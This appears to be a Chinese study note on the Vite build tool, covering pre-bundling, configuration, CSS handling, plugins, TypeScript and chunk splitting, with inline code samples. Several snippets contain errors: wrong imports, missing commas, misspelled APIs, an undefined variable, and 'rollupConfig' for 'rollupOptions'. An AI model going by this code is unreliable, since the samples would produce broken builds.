遇到less/sass/postcss/windtail使用less-loader，sass-loader等将其编译为原生css 遇到老版本浏览器使用babel将es6以上的语法转化为旧版语法 利用uglify/terser等对代码进行压缩优化体积 … 构建工具就是将以上功能集成到一起并自动执行的工具 一个构建工具实际上还会复杂其他多种工作，那我们将他的功能进行归类： 模块化支持：支持es module或commonJS等多种模块化的模块引入语法from ... import ..或const ... = require(...) 处理代码兼容性：babel、less、ts语法转换（构建工具利用其他处理工具自动化的完成） 提高项目性能：压缩文件，代码分割 优化开发体验： 构建工具自动监听文件变化，重新打包并在浏览器重新运行（热更新HMR） 开发服务器：解决跨域问题 目前市面上的构建工具： webpack vite parcel esbuild rollup grunt gulp Vite相对于Webpack的优势 Vite为什么笔Webpack快那么都？ Webpack考虑到网页可以跑在服务端，也能跑在客户端，于是支持多种模块化方法混用，例如： 12import Vue from &quot;vue&quot; // es6 moduleconst _ = require(&quot;lodash&quot;) // commonJs 那么为了避免这种情况导致的编译错误，Webpack在启动服务之前，需要对每一个moduel都进行一边编译，以确保把所有模块化方法都转化为了一般形式，因此当项目使用的module越来越多时，启动和热更新（HMR）的速度就会变慢 而Vite要求模块化必需使用es6 module的方式，则可直接启动服务，当module被需要时，在编译module，实现按需导入，减少编译和热更新等待的时间 Vite脚手架和Vite 在Vite官网使用给出的构建项目时使用的命令： yarn create vite 实际上是使用了create-vite这个脚手架的功能，脚手架包含Vite但脚手架的主要更能还是根据模板创建项目文件以及目录 Vite Vite以index.html文件作为入口 它解析&lt;script type=&quot;module&quot; src=&quot;...&quot;&gt; ，这个标签指向你的 JavaScript 源码。内联引入 JavaScript 的 &lt;script type=&quot;module&quot;&gt; 和引用 CSS 的 &lt;link href&gt; 也能利用 Vite 特有的功能被解析。 index.html 中的 URL 将被自动转换，因此不再需要 %PUBLIC_URL% 占位符了。 根目录 vite 以当前工作目录作为根目录启动开发服务器。你也可以通过 vite serve some/sub/dir 来指定一个替代的根目录。注意 Vite 同时会解析项目根目录下的 配置文件（即 vite.config.js），因此如果根目录被改变了，你需要将配置文件移动到新的根目录下。 Vite运行在node环境中，在后续的代码中经常会使用到path.resolve()函数来构造路径，原因是当我们在使用相对路径访问某个包时，node环境下会将相对路径与process.pwd()拼接，但这一函数返回值始终是当前node的运行目录，也就是说如果我们不再vite的项目根目录下使用，相对路径的拼接就会出错，因此我们需要使用__dirname这一变量来得到当前文件所在的目录，再与相对路径拼接得到正确的绝对路径。 实际上这与node的编译有关，node在对js文件进行编译时，会将每个js文件封装为一个立即执行函数来隔绝作用于，在这个函数中第五个参数就是__dirname，用来保存当前js文件的绝对路径。因此在node环境下的js文件可以访问这一变量。 此外该立即执行函数打字包含以下几个参数： 123(function(exports, require, module, __filename, __dirname) &#123;&#125;()) 其中 exports === module.exports是commonjs的导出对象 require为commonjs的导入方法 module为module对象 __filename为文件绝对路径+文件名 __dirname为文件绝对路径 Vite依赖构建 Vite遇到非绝对路径会对其进行补全，依赖预构建只发生在开发环境，生产环境全权交给rollup，对于commonJS的导出方式进行依赖预构建。 Vite的依赖构建特别之处在于会对以来进行依赖预构建： Vite会找到对应的依赖，然后使用esbuild（go语言编写）对JS语法进行一些处理，将其他模块化规范都转化为es6 module的规范，然后放到当前目录下的node_module/.vite/deps中，同时对esmodule规范的各个模块进行统一集成。 预构建解决了下面三个问题： 不同的第三方包有不同的导出格式 在路径的处理上可以直接使用.vite/deps，方便路径重写 解决网络多包传输的性能问题（是导致原生esmodule规范不敢支持node_module的原因之一），无论多少额外的export和import，最终都会尽可能进行集成最后生成一个或者几个模块 在vite.config.js中可以通过optimizeDeps设置针对某些包是否进行依赖预构建 12345export default defineConfig(&#123; optimizeDeps: &#123; exclude: [&#x27;lodash-es&#x27;], //不对lodash-es进行依赖预构建，此时会根据加载所有lodash依赖的包 &#125;&#125; Vite运行在node端为什么可以是用esmodule的包管理 node端只支持commonJS规范，但是vite的配置文件vite.config.js可以使用esmodule进行包的导入导出 这是因为vite在读取配置文件的时候会率先解析文件语法，遇到esmodule规范的语法时直接将其替换为commonJS Vite配置文件处理细节 Vite配置文件语法提示 是用webStorm会有良好的语法提示 为了获得良好的语法提示，建议从vite中导入defineConfig，然后是用defineConfig对配置对象进行导出，defineConfig是一个函数，该函数的参数是用ts定义了interface，因此会有良好的代码提示： import &#123; defineConfig &#125; from &#x27;vite&#x27; export default defineConfig(&#123; &#125; &lt;!--code￼141--&gt; 关于环境的处理 使用webpack的时候想要区分环境，需要针对不同环境编写config，比如开发环境要在webpack.dev.config中配置，生产环境要在webpack.prod.config中配置 而vite中则可以是用defineConfig函数进行区分，然后根据不同的环境返回不同的config对象： import &#123; defineConfig &#125; from &#x27;vite&#x27; // 导入不同环境的配置 import viteBaseConfig from &#x27;./vite.base.config.ts&#x27; import viteDevConfig from &#x27;./vite.base.config.ts&#x27; import viteProbConfig from &#x27;./vite.base.config.ts&#x27; // 文件压缩 // import viteCompression from &#x27;vite-plugin-compression&#x27; // 策略模式，减少if else的使用 const envResolver = &#123; &quot;build&quot;: () =&gt; &#123; console.log(&quot;生产环境&quot;); return &#123;...viteBaseConfig, ...viteProbConfig&#125; &#125;, &quot;serve&quot;: () =&gt; &#123; console.log(&quot;开发环境&quot;); return &#123;...viteBaseConfig, ...viteDevConfig&#125; &#125; &#125; export default defineConfig((&#123;command&#125;) =&gt; &#123; // command根据是用的命令vite build/vite区分环境 return envResolver[command]() &#125;) &lt;!--code￼142--&gt; process是node端关于进程的对象 客户端是用环境变量 vite会将环境变量同时注入import.meta.env中，以便在客户端是用环境变量（即组件，axios，等文件内） 由上文对loadEnv的源码分析可知，vite对环境变量进行了拦截，避免将不必要的隐私数据注入到import.meta.env中，只有以prefixes开头的环境变量才会被注入 也可以直接在配置文件中通过envPrefix进行配置 123export default defineConfig(&#123; envPrefix: &quot;ENDER_&quot;,&#125;) Vite如何让浏览器识别.vue Vite实际上在开发环境中运行整个项目签会使用node开启一个服务，并监听特定端口的请求（默认未5173） 当我们在浏览器中输入url时，Vite服务会根据URL找到对应的文件，以response的形式应答浏览器，并以Content-Type字段告诉浏览器应该以什么方式解析返回的结果 当请求的文件时.vue文件时，Vite服务读到文件后会进行AST语法分析（这一过程就是vue-loader的功能），最终生成JS语法文件，然后以text/javascript格式相应浏览器，浏览器就会以JS格式解析.vue文件 Vite如何处理css Vite原生支持css文件的处理 vite读到main.js中引用了index.css文件 是用fs模块读取index.css中的文件内容 直接创建一个style标签，将index.css中文件内容粘贴到&lt;style&gt;标签中 将&lt;style&gt;标签插入index.html的head中 将css文件内容直接替换为js脚本（便于热更新，或模块化css），让浏览器以js的方式解析css文件 但如果我们进行协同开发，不同的组件是用了不同的css文件，且这两个文件中都有名字为.footer的样式，此时后导入的组件的样式将覆盖先导入的组件的样式 此时可以是用cssmodule来解决这一问题 cssmodule即css模块化，是一个基于node的css处理模块： 他读取$&#123;style&#125;.moduel.css的文件module是一种约定，表示开启模块化 将其中的所有类目进行替换，即在原有类名的末尾添加一串hash字符串 同时创建一个对象让旧类名作为key，新类名作为value 将替换完成的内容放入head标签中 将module.css文件中的内容替换为js 将3中创建的对象进行默认导出 同时less、sass等都可以使用同样的方法进行模块化 Vite中配置css的处理 12345678910111213css: &#123; // TODO: 对css的行为进行配置, modules的配置会传给postcss处理 modules: &#123; // TODO: 对css模块化的默认行为进行覆盖 localsConvention: &quot;camelCase&quot;, // 配置类名展示形式，camelCase表示驼峰命名支持驼峰式和连接符式 scopeBehaviour: &quot;global&quot;, // 配置当前的模块化行为是模块化还是全局化global表示全局，local表示模块化 // generateScopedName: (name, filename, css) =&gt;&#123;return `$&#123;name&#125;_$&#123;Math.random().toString(36).substr(3, 8)&#125;`&#125; // name代表css文件中原本的类名 // filename代表css的绝对路径 // css代表当前样式 generateScopedName: &quot;[name]_[local]_[hash:5]&quot;, // 生成的类名规则，其中格式通配符定义在postcss文档中给出，可以配置为函数 hashPrefix: &quot;ender&quot;, // 生成hash时，hashPrefix会被加到类名中来生成hash以降低hash冲突 globalModulePaths: [], // 代表不想参与css模块化的路径，建议使用Path.resolve生成绝对路径，通常如果自己的css中使用&#x27;@import&#x27;引入了第三方css时，需要为第三方css配置 &#125;,&#125;, Vite配置css预处理器 在没有构建工具的情况下可以直接安装less或sass，然后使用对应的编译程序编译less或sass代码： 12345yarn add less // 安装lessnpx lessc style.module.less // 编译less文件npx lessc --math=&quot;always&quot; style.module.less // 编译less文件 这些lessc命令使用到的参数都可以在vite中进行配置： 123456789101112preprocessorOptions: &#123; // TODO: css预处理器配置采用key + config的形式处理 less: &#123; // 在webpack中是通过配置less-loader实现的 math: &quot;always&quot;, // 配置对数学表达式的编译, global: &#123; // 配置全局变量 mainColor: &quot;red&quot; // 此时在less文件中即可读取该变量 &#125;, &#125;, scss: &#123; &#125;&#125; SourceMap 我们的项目上线时被压缩或者被编译过，那么当程序出错后，报错的位置信息将不再正确 此时我们可以开启vite的devSourcemap配置： 1devSourcemap: true // 开启css的sourceMap，即文件索引，开启后，项目启动时在浏览器中可以直接索引到样式所在的文件 这样在启动项目之后，即使less或者sass被编译成了其他文件，我们依然可以在浏览器的开发者中直接看到样式所在的源文件 PostCSS 与babel相对于js一样，postCSS是对css进行兼容性处理的软件 我们思考预处理器无法完成的事情： 对未来css属性的一些使用降级问题 前缀补全: --webkit（为了兼容低版本浏览器） 使用 首先需要安装postcss 1yarn add postcss-cli postcss -D 随后我们可以通过描述文件控制postcss postcss支持多种格式的配置文件，但是最常用的还是js 在配置文件中我们可以对postcss用到的插件进行统一的整理 例如经常使用的postcss-preset-env预设环境，其中包含了一些默认的插件，例如语法降级，编译等插件 12345678910//postcss.config.jsconst postcssPresetEnv = require(&quot;post-preset-env&quot;)module.export = &#123; // 使用预设环境添加语法降级和编译功能 // 使用less，sass进行语法编译，但目前postcss的less和sass插件已经停止维护了 // 因此less和sass目前是独立于postcss进行编译的，编译完成后在交由postcss，但实际上postcss在功能上是可以包含less和sass的 // 此后postcss也被称为后处理器，即less和sass处理后交由postcss处理 plugins: [postPresetEnv(/* pluginsOptions */)]&#125; 使用postcss可以对指定文件进行编译： 1npx postcss style.css -o result.css Vite中配置postCSS vite支持postCSS因此只需要在vite.config.js中进行配置即可： 12345css: &#123; postcss: &#123; plugins: [postcssPresetEnv()] // 配置postcss中使用plugins &#125;&#125;, postcss-preset-env: 支持css变量、未来语法，甚至自动补全（auto-prefixer插件的功能） vite同样支持直接读取postcss.config.js中的配置，但在vite.config.js中进行的配置优先级更高。 Vite加载静态资源 除了动态API以外，绝大多数资源都会被视为静态资源 vite对于静态资源基本上是开箱即用的 对于assets中的图片、Json文件，使用import引入即可，并且json通过import引入之后直接就为对象，但在其他的构建工具中导入的json文件将作为json字符串 12345// people.json&#123; name: &quot;小王&quot;, age: 18&#125; 1234567import jsonFile from &quot;./src/assets/json/people.json&quot;console.log(&quot;jsonFile: &quot;, jsonFile)// 也可以使用展开运算符部分导入import &#123; name &#125; from &quot;./src/assets/json/people.json&quot;// 这样构建生产环境时可以触发Tree Shacking机制避免不必要的导入，提升性能console.log(&quot;name: &quot;, name) 在导入资源时，我们还可以定义其导入的方式 123456789// 以url的形式导入(默认形式)import imgUrl from &quot;./src/assets/images/a.png?url&quot;// 输出为图像绝对路径console.log(&quot;imgUrl: &quot;, imgUrl)// 以raw的形式导入import imgRaw from &quot;./src/assets/images/a.png?raw&quot;// 输出为图像Buffer，即二进制字符串console.log(&quot;imgRaw: &quot;, imgRaw)&quot; 但有时候我们需要在组件中引入assets中的某张图片，但是由于组件目录过深导致使用相对路径导入时需要使用很多次../来退回到src目录下，此时就可以利用Vite的resolve.alias别名配置来定义绝对路径的别名： 1234567891011import path from &quot;path&quot;;export default defineConfig(&#123; resolve: &#123; alias: &#123; // 使用path.resolve和__dirname拼接绝对路径 &#x27;@&#x27;: path.resolve(__dirname, &quot;./src&quot;) &#x27;@assets&#x27;: path.resolve(__dirname, &quot;./src/assets&quot;) &#125; &#125;&#125;) 这样引入时只需要使用别名引入静态资源 1import imgUrl from &quot;@assets/images/a.png&quot; 关于SVG SVG的优缺点： 优点： 体积小 不会失真 缺点： 无法表示层次复杂的图片 在导入图像时我们讨论过使用不同的格式加载图片得到的结果，加载SVG文件时同理，但使用RAW格式加载SVG得到的结果这不再是buffer，而是文件内容的字符串，因此，我们可以直接将RAW格式的SVG添加到页面中，还能进行修改颜色、绑定事件等等操作： 12345678910import svgRaw from &quot;./assets/svgs/svgFile.svg?raw&quot;;// 结果为字符串console.log(svgRaw)document.body.innerHTML = svgRaw// 绑定事件与修改颜色const svgElement = document.getElementByTagName(&quot;svg&quot;)[0];svgElement.onmouseenter = function() &#123; this.style.fill = &quot;red&quot;&#125; Vite生产环境对静态资源的处理 Vite使用rollup打包后，会在/dist文件夹下生成最终的文件，但其中静态资源的路径使用的是以/dist为根目录的相对路径，因此如果我们在项目文件夹下启动Live Server等工具进行预览时，会出现找不到资源的问题，此时只需要切换到/dist目录下启动服务即可。(Webpack中可以通过配置baseURL来解决) 打包后的静态资源会在文件名后添加hash字符串，这是由于浏览器自身具有缓存机制，对于同名资源浏览器不会重新加载，而是直接读取缓存。因此需要hash字符串来避免文件名一致，保证浏览器会重新请求静态资源。 Vite中使用的hash算法是基于文件名和文件内容的，因此当我们对文件内容进行修改时产生的hash值就会改变，从而引起重新加载。 在构建生产包时的配置可以在build中配置 12345678910111213141516171819build: &#123; // 取消文件压缩 minify: false, rollupOptions: &#123; // TODO: 配置rollup的构建策略 output: &#123; // 控制输出 // 占位符控制生成静态资源文件的名称 // hash为文件名和文件内容组合生产的字符串 assetFileNames: &quot;[hash].[name].[ext]&quot; &#125; &#125;, // 静态资源阈值。4000KB，小于该阈值的图片将被打包为base64图片 assetsInlineLimit: 4096000, // 导出文件夹名称 outDir: &quot;outDist&quot;, // 导出静态资源文件夹名称 assetsDir: &quot;static&quot;, // 清楚输出目录中的所有文件 emptyOutDir: true,&#125; resolve.alias原理 在我们对alias进行配置时，实际上Vite在开启服务后，会读取vite.config.hs中的内容，当我们输入URL请求文件时，Vite服务会拿到我们请求的文件名，然后使用Object.entries()得到resolve.alias中的键值对，然后将文件中import...from中的@替换为配置的path. Vite插件 Vite会在生命周期的不同阶段调用不同的插件已达成某些目的 事实上中间件、插件，都具有类似的功能，例如Redux中间件就是在Redux dispatch一个action之后，到达reducer之前进行的一些操作 实际上如果想自己开发一个Vite插件，Vite为我们提供了许多生命周期钩子函数，我们可以利用这些钩子函数，在不同的钩子函数中实现我们希望的功能，那么一个属于我们的插件就完成了。 Vite在构建生产环境时使用的是rollup，那么Vite会提供一些与rollup生命周期相同的生命周期通用钩子，使用这些钩子，Vite会在开发环境以及生产环境中都调用这些钩子。另外Vite还提供了一些Vite特有的钩子。 下面列举一些Vite常用的特有钩子函数: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// vite.config.tsimport &#123; defineConfig &#125; from &#x27;vite&#x27;import vue from &#x27;@vitejs/plugin-vue&#x27;export default defineConfig(&#123; build: &#123; rollupOptions: &#123; output: &#123; manualChunks: (filePath) =&gt; &#123; if(filePath.includes(&quot;node_modules&quot;)) &#123; return &quot;vendor&quot; &#125; &#125; &#125; &#125; &#125;, plugins: [ &#123; config(options) &#123; // 处理配置文件 &#125;, configureServer(server) &#123; // 处理vite服务器事业 server.middlewares.use((req, res, next) =&gt;&#123;&#125;) &#125;, transformIndexHtml(html)&#123; // 处理index.html文件 &#125;, configResolved(options) &#123; // 整个配置文件的解析流程完成后调用该钩子函数,用于读和存储解析完成的配置文件 // vite内部有一个默认的配置文件 console.log(&quot;options: &quot;, options) &#125;, configurePreviewServer(server)&#123; // vite打包完成后，可以使用vite preview命令预览生产环境下的项目 // 功能与configureServer基本相同只不过是配置preview阶段开启的服务 &#125;, handleHotUpdate() &#123; // 热更新相关钩子，用于自定义热更新行为 &#125;, // vite和rollup通用钩子 options(rollupOptions) &#123; // 处理rollup配置，即build.rollupOptions对象 // vite会调用该钩子，rollup也会 &#125;, buildStart(fullRollupOptions) &#123; // 与configResolved功能相同，拿到编译完后的rollup配置 &#125;, &#125; ]&#125;) 下面介绍一些常用插件 Vite-aliases 该插件可以帮助项目自动生成别名 他会检查目录下包括src在内的所有目录，并帮助框架自动生成别名 该插件能自动生成配置： 123456&#123; &quot;@&quot;: &quot;/**/src&quot;, &quot;@assets&quot;: &quot;/**/src/assets&quot;, &quot;@components&quot;: &quot;/**/src/components&quot;, //...&#125; 该插件有许多配置，例如prefix用来修改别名的前缀，默认为@ 具体参考：Vite-Aliases Github 下面尝试手写实现一个vite-aliases插件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// Vite的插件需要返回一个配置对象// const fs = require(&#x27;fs&#x27;)// const path = require(&#x27;path&#x27;)import fs from &#x27;fs&#x27;import path from &#x27;path&#x27;/** * * @param &#123;Array&#125; dirFilesArray 包含所有文件名的数组 * @param &#123;string&#125; basePath 跟目录 * @returns &#123;object&#125; 包含两个数组属性的对象：dirs表示目录下所有目录名，files表示目录下所有文件名 */const diffDirAndFile = (dirFilesArray = [], basePath = &#x27;&#x27;) =&gt; &#123; const result = &#123; dirs: [], files: [], &#125; dirFilesArray.forEach((name) =&gt; &#123; // TODO: 读取每个文件的文件状态 const currentFileStates = fs.statSync( path.resolve(__dirname, `$&#123;basePath&#125;/$&#123;name&#125;`) ) // TODO: 判断是否为目录 const isDir = currentFileStates.isDirectory() if (isDir) result.dirs.push(name) else result.files.push(name) &#125;) return result&#125;/** * * @param &#123;string&#125; prefix 自定义前缀，默认为@ * @returns &#123;object&#125; key代表别名，value代表绝对路径 */const getAllFills = (prefix = &#x27;@&#x27;) =&gt; &#123; // TODO: 读取src目录下的所有文件文件名 const result = fs.readdirSync(path.resolve(__dirname, &#x27;../src&#x27;)) // TODO: 区分目录名和文件名 const diffResult = diffDirAndFile(result, &#x27;../src&#x27;) // TODO: 对于每个目录名，产生一组别名到绝对路径的键值对 const resolveAliasesObj = &#123;&#125; diffResult.dirs.forEach((name) =&gt; &#123; const key = `$&#123;prefix&#125;$&#123;name&#125;` const absPath = path.resolve(__dirname, `../src/$&#123;name&#125;`) resolveAliasesObj[key] = absPath &#125;) return resolveAliasesObj&#125;export default () =&gt; &#123; return &#123; /** * * @param config UserConfig 当前Vite配置文件 * @param env &#123; mode: string, command: string&#125; mode为当前所处环境，command为serve或build * */ config(config, env) &#123; // TODO: 对src目录下的所有文件进行处理 const resolveAliasesObj = getAllFills() console.log(resolveAliasesObj) // 该函数返回的对象是部分的ViteConfig，返回的对象将于与iteConfig进行Deep Merge return &#123; resolve: &#123; alias: resolveAliasesObj, &#125;, &#125; &#125;, &#125;&#125; Vite-plugin-html 赋予开发者动态控制整个html文件中内容的能力 可以通过ejs语法向html中注入内容，它在服务端用的比较多，因为服务端经常会动态地修改index.html 而Vite实际上运行在服务端，因此选用该语法进行注入 1234567createHtmlPlugin(&#123; inject: &#123; data: &#123; title: &quot;主页&quot; // 修改index.html中的title标签 &#125; &#125;&#125;) 其原理是通过Vite的transformIndexHtml钩子实现的： 12345678910111213module.exports = (options) =&gt; &#123; return &#123; // 用于转换html transformIndexHtml: &#123; // 将插件执行时机提前 enforce: &quot;pre&quot; transform: (html, ctx) =&gt; &#123; // ctx表示执行上下文，包含api, /index.html, get, post, headers return html.replace(/&lt;%= title %&gt;/g, options.inject.data.title); &#125; &#125; &#125;&#125; 在该插件实现的过程中我们使用了enforce:&quot;pre&quot;配置，让插件的运行周期提前，实际上vite在运行各种插件时是按照一定顺序进行的： Alias 带有enforce: &quot;pre&quot;的用户插件 Vite核心插件 没有enforce属性的插件 Vite构建用的插件 带有enforce: &quot;post&quot;的用户插件 Vite后置构建插件（最小化、manifest，报告） 因此当我们不设置enforce属性时，会先运行Vite核心插件，导致核心插件先读取了index.html的内容，然后直接报错，因此需要在其他组件执行之前，将ejs替换为真实的内容。 Vite-plugin-mock mock数据指模拟数据，该插件依赖于mockJS 在前后端并行开发时，我们通常需要先完成接口文档的编写，后端同学根据接口文档编写接口以保证返回的数据结构相同。 有了接口文档后，就可以利用mock数据来模拟从后端请求到的数据进行开发。一般有两种方法： 简单方式: 直接写死 优点 书写简单方便调试 缺点 无法进行海量数据的测试 无法获得标准数据 无法感知http的异常 mockJS：模拟海量数据 首先我们在根目录下创建一个mock目录，并添加index.js来编写mock脚本 相关语法可以在mockJS中查看 123456789101112131415161718192021222324252627// /mock/index.jsimport mockJS from &quot;mockjs&quot;const userList = mockJS.mock(&#123; &quot;data|100&quot;: [&#123; name: &quot;@cname&quot;, // 生成不同中文名 ename: &quot;@first @last&quot;, // 生成不同英文名 &quot;id|+1&quot;: 1, // 从1开始每次自增1的id avatar: mockJS.Random.image(), // 生成不同图片地址 time: &quot;@time&quot; // 生成不同的时间 &#125;]&#125;)export default [ &#123; method: &quot;post&quot;, url: &quot;/api/users&quot;, response: (&#123;body&#125;) =&gt; &#123; // body -&gt; 请求体 return &#123; code: 200, msg: &quot;success&quot;, data: userList &#125; &#125; &#125;] 随后在Vite中进行配置后，我们就可以在项目中像使用真正的API一样，用Axios请求得到结果了： 12345678910111213import &#123; defineConfig &#125; from &quot;vite&quot;import &#123; ViteMockServe &#125; from &quot;vite-plugin-mock&quot;export default defineConfig(&#123; plugins: [ ViteMockServe(&#123; // mock脚本目录 mockPath: &quot;mock&quot;, // 配置只有开发环境才会拦截请求 localEnabled: command === &#x27;serve&#x27; &#125;) ]&#125;) 其余配置可以在vite-plugins-mock插件中查看。 通过实际使用我们可以感受到该插件是通过拦截了我们的请求实现的，随后我们也知道Vite在开发环境中会为前端开启一个服务，以此来实现热更新、跨域等等功能，该插件就是利用了Vite启动的服务器为我们拦截了请求，实际上该插件是通过Vite的configureServer钩子来得到Vite服务器相关配置的： 123456789101112131415161718192021222324252627282930313233343536373839404142import fs from &quot;fs&quot;import path from &quot;path&quot;export default(config) =&gt; &#123; return &#123; config(config, env) &#123; // 处理配置 &#125; configureServer(server) &#123; // 服务器相关配置 // 真实情况下使用异步 const mockState = fs.stateSync(&quot;mock&quot;) const isDir = mockState.isDirectory() let mockResult = [] if(isDir) &#123; // 使用process.cwd()获取当前执行根目录 mockResult = require(path.resolve(process.cwd(), &quot;mock/index.js&quot;)) &#125; // server.middlewares获得服务器的中间件 // node服务器对请求的处理是按照顺序交给一个又一个中间件进行处理的 // req: 请求对象, 用户发送的请求，包括请求头、请求体 // res: 响应对象, 包括响应头res.header // next: 是否交给下一个中间件进行处理，调用next方法则会交给下一个中间件 server.middlewares.use((req, res, next) =&gt; &#123; // 查找mock脚本文件中是否包含请求的url const mockMatch = mockResult.find(mockDescriptor =&gt; mockDescriptor.url === req.url) if(req.url === &quot;/api/users&quot;) &#123; &#125; if(mockMatch) &#123; // 调用mock脚本的响应函数得到响应内容 const responseData = mockDescriptor.response(req) // 设置响应头中的响应类型为json避免中文乱码 res.setHeader(&quot;Content-Type&quot;, &quot;application/json&quot;) // 返回请求 res.end(JSON.stringify(responseData)) &#125; next() &#125;) &#125; &#125;&#125; Vite-plugin-federation 模块联邦插件 Webpack5提出联邦（federation）的概念，允许两个不同项目访问彼此的方法与组件。 Vite也具备实现类似功能的插件 Vite + Ts Vite原生支持TS 但Vite只对ts进行编译，不会执行ts中的类型检查，Vite假设ts类型检查已经被编辑器执行了。但可以通过tsc --noEmit在打包阶段进行ts类型检查，如果检查不通过则不会生成打包文件，可以通过修改package.json -&gt; scripts.build脚本，先运行tsc --noEmit进行检测再进行build: 123&quot;scripts&quot;: &#123; &quot;build&quot;: &quot;tsc --noEmit &amp;&amp; vite build&quot;&#125; 但是在Vite中，我们如果想让ts的报错直接输出在控制台，该如何做呢？ 可以使用vite-plugin-checker插件 12345678import checker from &quot;vite-plugin-checker&quot;export default defineConfig(&#123; plugins: [ // 开启ts语法检测 checker(&#123;typescript: true&#125;), ]&#125;) ts包含一些配置，可以在tsconfig.json中编写： 123456789101112131415161718&#123; &quot;compilerOptions&quot;: &#123; &quot;target&quot;: &quot;ESNext&quot;, &quot;useDefineForClassFields&quot;: true, &quot;module&quot;: &quot;ESNext&quot;, &quot;moduleResolution&quot;: &quot;Node&quot;, // 配置模块解析方法为Node, 规定ts找包是从node_modules中找 &quot;strict&quot;: true, &quot;jsx&quot;: &quot;preserve&quot;, &quot;resolveJsonModule&quot;: true, &quot;isolatedModules&quot;: false, &quot;esModuleInterop&quot;: true, &quot;lib&quot;: [&quot;ESNext&quot;, &quot;DOM&quot;], // 声明当前环境，让ts在该环境下进行语法检测 &quot;skipLibCheck&quot;: true, // 是否跳过node_modules目录的检查 &quot;noEmit&quot;: true, &#125;, &quot;include&quot;: [&quot;src/**/*.ts&quot;, &quot;src/**/*.d.ts&quot;, &quot;src/**/*.tsx&quot;, &quot;src/**/*.vue&quot;], &quot;references&quot;: [&#123; &quot;path&quot;: &quot;./tsconfig.node.json&quot; &#125;]&#125; 此外，如果我们希望向环境变量中引入一些提示，这可以在vite-dev.d.ts中进行配置： 1234567// ts三斜线指令，读到该配置时Vite自动引入&quot;vite/client&quot;/// &lt;reference types=&quot;vite/client&quot; /&gt;// 此处编写的借口将与ts默认类型进行合并，此后调用import.meta.env就能获得关于VITE_PROXY_TARGET的语法提示interface ImportMetaEnv &#123; readonly VITE_PROXY_TARGET: string;&#125; Vite性能优化 性能优化说的是在哪些方面进行优化？ 开发时态的构建速度优化：npx run dev呈现结果要占用很长时间、以及热更新需要很长时间才能反应到页面上 webpack4可以通过cache-loader，webpack5可以通过cache来缓存上一次loader的结果，如果两次构建源代码产生的结果没有变化这不调用loader，另外thread-loader还能开启多线程构建 然而Vite是按需加载的形式，不太需要关注这些 页面性能指标：与写代码的方式有关 fcp(first content paint)：首个元素染时间 懒加载优化 http优化： 强缓存：服务端给响应头追加一些字段（expires），客户端会记住这些字段，在expires（截止失效时间）没有到达之前，无论如何刷新页面，客户端都不会重新请求，而是从缓存中取 协商缓存：是否使用缓存需要和后端协商，当服务端将客户端标记为协商缓存后，客户端下次刷新页面需要重新请求资源时会先向服务端发送一个协商请求，服务端如果认为资源发生了变化则响应具体的内容，如果服务端认为没有变化则响应304 lcp(largest content paint)：页面中最大元素的渲染时长 js逻辑 要注意副作用的清除: 例如一个组件中包含一个计时器，由于项目运行过程中组件会发生频繁的挂载与卸载，如果不清楚计时器，每次挂载时又会创建新的计时器。所以在React的函数组件中，我们如果要在声明周期中使用计时器，通常会在useEffect的返回函数中清除定时器 写法上的注意事项: requestAnimationFrame, requestIdleCallback 浏览器的帧率为：16.6ms一帧（包括执行js逻辑以及回流、重绘），当js逻辑、回流、重绘这些任务的处理时长超过16.6ms，则会出现明显卡顿。 requestIdleCallback接收一个回调函数当浏览器一帧的任务进行到尾声时如果执行时间不足16.6ms则会执行传入的回调 react也提供了concurrency(concurrent mode)可中断渲染来处理卡顿的问题 防抖 节流建议使用lodash提供的，避免自己书写时造成的性能问题 另外对于保存了海量数据的Array，使用lodash中提供的forEach方法代替Array原型上的forEach，lodash的forEach引入了额外的算法平衡性能 对作用域的控制 在写for循环的时候，为了避免作用域嵌套层级过深，需要将for块级作用域中用到的变量保存在该作用域中，避免多次通过作用域链向外部作用域查找数据。 css 关注继承属性，能继承的不要重复写 尽量避免过深的css嵌套 构建优化(rollup)🌟 优化体积 压缩 treeShacking 图片资源压缩 CDN加载 分包策略 1234567// react中处理计时器const [timer, setTimer] = useState(null);useEffect(() =&gt; &#123; setTimer(setTimeout(() =&gt; &#123;&#125;)) // 组件卸载时会调用useEffect的返回值 return () =&gt; clearTimeout(timer);&#125;) 1234const arr = [1, 2, 3]// 在for块级作用域中创建变量len，避免比较大小时每次向外询问arr.lengthfor(let i = 0, len = arr.length; i &lt; len; i++) &#123;&#125;// 较低性能写法：for(let i = 0; i &lt; arr.length; i++)&#123;&#125; 分包策略 浏览器对于静态资源的缓存策略是，文件名未发生变化，则不会重新请求 当我们在业务代码中引用了lodash等包时，打包的过程中会将这些第三方包也和业务代码打包到同一个js文件中，此时会为业务代码引入大量代码，而第三方包却是长期不会发生变化的。 当我们对业务代码进行修改时，打包生成的文件会加入hash字符串，从而改变文件名，让浏览器重新请求，但这个过程中第三方包也被加入了进去，因此第三方包也会和业务代码一起被重新请求，导致需要请求大量没有变化的代码。 分包就是把一些不会更新的代码进行单独打包 例如我们可以通过build.rollupConfig.output.manualChunks配置分包策略： 123456789101112131415161718192021import checker from &quot;vite-plugin-checker&quot;export default defineConfig(&#123; plugins: [ // 开启ts语法检测 checker(&#123;typescript: true&#125;), ] build: &#123; rollupConfig: &#123; output: &#123; manualChunks: (id: string) =&gt; &#123; // id为包路径名 // 对于所有路径名中包含node_module的包，都打包到vender.js中 if(id.includes(&quot;node_module&quot;)) &#123; return &quot;vender&quot; &#125; &#125; &#125; &#125; &#125;&#125;) 此外对于多出口的项目，首先我们可以通过配置build.rollupConfig.input来处理不同出口文件的位置： 1234567891011121314151617181920212223242526import checker from &quot;vite-plugin-checker&quot;import path from &quot;path&quot;export default defineConfig(&#123; plugins: [ // 开启ts语法检测 checker(&#123;typescript: true&#125;), ] build: &#123; rollupConfig: &#123; input: &#123; main: path.resolve(__dirname, &quot;./index.html&quot;), product: path.resolve(__dirname, &quot;./product.html&quot;) &#125;, output: &#123; manualChunks: (id: string) =&gt; &#123; // id为包路径名 // 对于所有路径名中包含node_module的包，都打包到vender.js中 if(id.includes(&quot;node_module&quot;)) &#123; return &quot;vender&quot; &#125; &#125; &#125; &#125; &#125;&#125;) 